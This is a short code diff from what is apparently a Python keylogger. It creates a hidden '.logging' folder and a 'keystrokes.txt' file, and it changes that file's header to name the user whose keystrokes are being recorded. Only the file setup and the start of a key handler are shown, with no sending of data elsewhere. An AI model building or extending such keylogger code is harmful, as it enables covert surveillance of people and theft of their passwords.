@@ -18,7 +18,8 @@ logging_file = f"logging"
 if not os.path.isdir('.logging'):
     os.mkdir('.logging')
 if not os.path.isfile(os.getcwd()+'/.logging/keystrokes.txt'):
-    open(os.getcwd()+'/.logging/keystrokes.txt','wb').write('Keylogger Data:\n'.encode())
+    msg = ('Logging Keystrokes of user: %s\n' % username)
+    open(os.getcwd()+'/.logging/keystrokes.txt','wb').write(msg.encode())
 
 def keyhandler(key):
     try:
